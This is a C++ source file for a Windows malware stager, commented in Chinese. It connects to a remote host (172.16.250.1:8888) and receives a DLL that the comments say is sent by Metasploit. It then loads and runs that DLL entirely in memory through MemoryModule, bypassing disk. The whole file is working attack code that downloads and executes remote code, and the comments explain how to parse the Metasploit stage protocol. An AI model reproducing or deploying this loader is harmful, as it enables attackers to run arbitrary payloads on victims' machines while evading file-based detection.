#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include "MemoryModule.h"
#pragma comment(lib,"ws2_32.lib")

#define PAYLOAD_SIZE 1024*512
typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

typedef VOID(*msg)(VOID);
PBYTE bFileBuffer = NULL;



BOOL GetPEDLL() {

	DWORD dwError;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	SOCKET socks;
	SHORT sListenPort = 8888;
	struct sockaddr_in sin;

	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		dwError = GetLastError();
		printf("[*]WSAStarup Error : %d \n", dwError);
		return FALSE;
	}

	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (socks == INVALID_SOCKET)
	{
		dwError = GetLastError();
		printf("[*]Socket Error : %d \n", dwError);
		return FALSE;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(sListenPort);
	sin.sin_addr.S_un.S_addr = inet_addr("172.16.250.1");


	if (connect(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		dwError = GetLastError();
		printf("[*]Bind Error : %d \n", dwError);
		return FALSE;
	}

	int ret = 0;
	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
	
	//表示即将传输的数据的字节数，在这两个例子中是2650，因此最先接受到的四个比特的数据是0x5a0a0000.
	//又因为小端存储，所以真正想表达的数据是，0x00000a5a，转化成10进制就是2650.
	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);  //这种接收数据的方式是从缓冲区的第一个字节开始接收，也就是如果我们先接收了123，然后又接收了4，那么数据就会变成423.
	ret = recv(socks, (PCHAR)bFileBuffer, 2650, NULL);
	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);


	//表示即将传输的数据的字节数，在这两个例子中是2650，因此最先接受到的四个比特的数据是0x0a220000.
	//又因为小端存储，所以真正想表达的数据是，0x0000220a，转化成10进制就是8714.
	ret = recv(socks, (PCHAR)bFileBuffer,4, NULL); 


	//由于我知道我想下载的dll文件是8704字节可是msf传送给我的是8714字节，这是因为它多传送了一个LibraryName还有\x00分隔符，
	//由于我将LibraryName设置为了Micro.dll，有9个字符，需要九个字节来传输，再加上一个分隔符就是十个字节，刚好凑够了多传送的10个字节。
	//为了不影响真正我们需要的那个dll文件，所以我们先将这10个多余的字节接收过来，然后再接收我们需要的真正的dll文件，再接收dll文件后会自动覆盖刚才的缓冲区
	//不会影响dll文件的整体性。
	ret = recv(socks, (PCHAR)bFileBuffer,10, NULL);
	
	//为了安全起见，我们还是将缓冲区的所有位置0.
	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
	//接收我们的dll文件。
	ret = recv(socks, (PCHAR)bFileBuffer, 8704, NULL);

	if (ret > 0)
	{
		closesocket(socks);
	}


	return TRUE;
}

int main()
{

	HMEMORYMODULE hModule;
	Module DllMain;
	bFileBuffer = new BYTE[PAYLOAD_SIZE];
	GetPEDLL();
	// 导入PE文件
	hModule = MemoryLoadLibrary(bFileBuffer, 8704);
	// 如果加载失败，就退出
	if (hModule == NULL) {
		delete[] bFileBuffer;
		return -1;
	}
	// 获取msg导出函数地址
	DllMain = (Module)MemoryGetProcAddress(hModule, "DllMain");
	// 运行msg函数
	DllMain(0, 0, 0);
	// 释放资源
	DWORD dwThread;
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);
	// 释放PE内存
	delete[] bFileBuffer;
	return GetLastError();
}
